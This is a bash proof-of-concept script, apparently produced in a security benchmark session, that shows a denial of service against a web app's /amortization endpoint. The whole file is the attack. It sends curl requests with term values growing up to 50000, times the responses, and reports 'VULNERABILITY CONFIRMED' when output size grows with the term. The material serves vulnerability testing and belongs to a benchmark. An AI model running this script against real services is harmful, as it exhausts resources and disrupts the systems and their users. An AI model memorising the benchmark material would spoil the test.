#!/bin/bash
# POC: Demonstrates DoS via uncontrolled resource consumption in the /amortization endpoint's term parameter. Sends requests with progressively larger term values and measures response sizes to prove lack of input validation.
# Target: ./repo
# Created: 2025-11-04T19:39:57.608Z
# Session: benchmark-XBEN-023-24-mhkytbq3

# DoS via Uncontrolled Resource Consumption in Term Parameter
# This POC demonstrates the vulnerability by requesting amortization schedules
# with increasingly large term values and measuring the response sizes

TARGET_URL="${1:-http://localhost}"
ENDPOINT="${TARGET_URL}/amortization"

echo "=========================================="
echo "DoS Vulnerability: Uncontrolled Term Parameter"
echo "=========================================="
echo ""

# Test 1: Normal term value
echo "[*] Test 1: Normal term value (term=360)"
RESPONSE_SIZE=$(curl -s "${ENDPOINT}?principal=10000&rate=5&term=360" | wc -c)
echo "    Response size: $RESPONSE_SIZE bytes"
echo ""

# Test 2: Moderate term value
echo "[*] Test 2: Moderate term value (term=1200)"
RESPONSE_SIZE=$(curl -s "${ENDPOINT}?principal=10000&rate=5&term=1200" | wc -c)
echo "    Response size: $RESPONSE_SIZE bytes"
echo ""

# Test 3: Large term value - demonstrates vulnerability
echo "[*] Test 3: Large term value (term=10000)"
RESPONSE_SIZE=$(curl -s "${ENDPOINT}?principal=10000&rate=5&term=10000" | wc -c)
echo "    Response size: $RESPONSE_SIZE bytes"
echo ""

# Test 4: Very large term value - demonstrates severity
echo "[*] Test 4: Very large term value (term=50000)"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s "${ENDPOINT}?principal=10000&rate=5&term=50000")
END_TIME=$(date +%s%N)
RESPONSE_SIZE=$(echo "$RESPONSE" | wc -c)
RESPONSE_TIME=$((($END_TIME - $START_TIME) / 1000000))
echo "    Response size: $RESPONSE_SIZE bytes"
echo "    Response time: ${RESPONSE_TIME}ms"
echo ""

# Verify the vulnerability exists (no input validation)
echo "[*] Verification: Checking for vulnerability indicators..."
SMALL_RESPONSE=$(curl -s "${ENDPOINT}?principal=10000&rate=5&term=5")
LARGE_RESPONSE=$(curl -s "${ENDPOINT}?principal=10000&rate=5&term=5000")

SMALL_SIZE=$(echo "$SMALL_RESPONSE" | wc -c)
LARGE_SIZE=$(echo "$LARGE_RESPONSE" | wc -c)

# Calculate if response grows with term value
echo "    Small term (5) response size: $SMALL_SIZE bytes"
echo "    Large term (5000) response size: $LARGE_SIZE bytes"
echo ""

if [ $LARGE_SIZE -gt $SMALL_SIZE ] && [ $SMALL_SIZE -gt 100 ]; then
    GROWTH_RATIO=$((LARGE_SIZE / SMALL_SIZE))
    echo "[+] VULNERABILITY CONFIRMED: Response size grows with term parameter"
    echo "    Growth factor: ${GROWTH_RATIO}x"
    echo "    No input validation detected on term parameter"
    echo "    Attacker can cause significant resource consumption"
    exit 0
else
    echo "[-] Could not confirm vulnerability"
    exit 1
fi